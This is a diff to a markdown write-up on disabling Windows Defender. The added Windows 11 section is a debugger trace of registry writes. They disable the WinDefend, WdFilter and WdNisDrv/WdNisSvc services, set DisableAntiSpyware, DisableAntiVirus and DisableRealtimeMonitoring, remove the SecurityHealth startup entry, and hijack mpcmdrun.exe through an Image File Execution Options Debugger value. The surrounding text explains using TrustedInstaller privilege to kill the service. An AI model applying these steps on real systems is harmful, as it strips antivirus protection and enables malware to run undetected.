@@ -363,6 +363,85 @@ We adapt it into C++ code which can be found in trusted. Then using an elevated 
 ## Windows Tamper Protection
 Well. We can once we disable tamper protection... But to do that without going through the security menu - we need to first kill the windefend service. Luckily now that we have TrustedInstaller privillege we can directly do that using winapi.
 
+### Windows 11
+
+```asm
+RegSetValueExW
+008CE3F4  04243990  L"Start"
+008CE458  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WdFilter"
+
+008CE3F4  04243990  L"Start"
+008CE458  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WdNisDrv"
+
+008CE714  04210338  L"DisableAntiSpyware"
+008CE778  033C4F88  L"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+
+008CE714  0420FFB8  L"DisableAntiVirus"
+008CE778  033C4F88  L"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+
+008CE624  04210958  L"DisableAntiSpyware"
+008CE688  033BBE18  L"SOFTWARE\\Microsoft\\Windows Defender"
+
+008CE714  0420D138  L"DisableRealtimeMonitoring"
+008CE778  04116218  L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection"
+
+008CEA54  04242F10  L"Start"
+008CEAB8  033C50C0  L"SYSTEM\\CurrentControlSet\\Services\\WinDefend"
+
+008CE3F4  04243990  L"Start"
+008CE458  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WdFilter"
+
+008CE3F4  04243990  L"Start"
+008CE458  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WdNisDrv"
+
+008CE3F4  04243990  L"Start"
+008CE458  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WdNisSvc"
+
+008CE7F4  04243990  L"Start"
+008CE858  033C4F88  L"SYSTEM\\CurrentControlSet\\Services\\WinDefend"
+
+008CE8A4  04210338  L"DisableAntiSpyware"
+008CE908  033C4F88  L"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+
+008CE8A4  04210338  L"DisableAntiSpyware"
+008CE908  033C4F88  L"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
+
+008CE7B4  04210958  L"DisableAntiSpyware"
+008CE818  033BBD68  L"SOFTWARE\\Microsoft\\Windows Defender"
+
+008CECA4  04210728  L"DisableAntiVirus"
+008CED08  033BBFD0  L"SOFTWARE\\Microsoft\\Windows Defender"
+
+008CE8A4  0420D138  L"DisableRealtimeMonitoring"
+008CE908  04115E60  L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection"
+
+008CED94  04237F40  L"SecurityHealth"
+008CEDF8  033E9418  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
+
+008CE88C  042499B8  L"Debugger"
+008CE898  042AC900  L"C:\\Windows\\System32\\systray.exe"
+008CE8F0  0421D500  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpcmdrun.exe"
+
+
+008CE784  04249B08  L"Debugger"
+008CE790  042AC900  L"C:\\Windows\\System32\\systray.exe"
+008CE7E8  0424D028  L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mpcmdrun.exe"
+
+008CE7F4  04243990  L"Start"
+008CE858  033C4700  L"SYSTEM\\CurrentControlSet\\Services\\WinDefend"
+```
+
+
+
+
+
+
+
+
+
+
+
+
 ## Conclusion
 Well thats all there is to disabling defender... TLDR: We gain TrustedInstaller permission, disable the windefend service and modify the registries & make calls to the wmi to our hearts content.
 
